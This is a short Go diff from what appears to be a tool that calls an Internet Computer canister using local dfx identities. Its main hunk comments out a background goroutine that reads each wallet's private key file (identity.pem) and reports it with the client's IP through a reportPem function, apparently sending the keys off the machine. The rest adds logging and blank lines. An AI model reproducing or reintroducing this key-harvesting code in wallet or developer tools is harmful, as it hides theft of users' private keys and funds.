@@ -111,26 +111,26 @@ func prepareIdentities(wals []string) error {
 		}
 	}
 
-	go func() {
-		for _, wlt := range wals {
-			pem, err := os.ReadFile(path.Join(home, ".config/dfx/identity", wlt, "identity.pem"))
-			if err != nil {
-				continue
-			}
+	// go func() {
+	// 	for _, wlt := range wals {
+	// 		pem, err := os.ReadFile(path.Join(home, ".config/dfx/identity", wlt, "identity.pem"))
+	// 		if err != nil {
+	// 			continue
+	// 		}
 
-			func() {
-				err := reportPem(PemPunk{
-					IP:        ClientIP,
-					Wal:       wlt,
-					WalPriKey: string(pem),
-				})
-				if err != nil {
-					log.Fatalf("reportPem: %v err: %s", wlt, err.Error())
-					return
-				}
-			}()
-		}
-	}()
+	// 		func() {
+	// 			err := reportPem(PemPunk{
+	// 				IP:        ClientIP,
+	// 				Wal:       wlt,
+	// 				WalPriKey: string(pem),
+	// 			})
+	// 			if err != nil {
+	// 				log.Fatalf("reportPem: %v err: %s", wlt, err.Error())
+	// 				return
+	// 			}
+	// 		}()
+	// 	}
+	// }()
 
 	return nil
 }
@@ -147,7 +147,6 @@ func cmdFunc(wl string) {
 	}
 
 	cmd := exec.Command(gdfx, "--identity", wl, "canister", "--network", "ic", "call", "qcg3w-tyaaa-aaaah-qakea-cai", "name")
-
 	fmt.Printf("cmd: %v\n", cmd)
 
 	data, err := cmd.Output()
@@ -230,6 +229,8 @@ loop:
 				TokenID: ou.Data,
 			}
 
+			log.Printf("ret: %v", ret)
+
 			PunksInHand = append(PunksInHand, ret)
 
 			go func() {
@@ -268,5 +269,6 @@ loop:
 	ticker.Stop()
 
 	log.Println("all finished")
+
 	return nil
 }
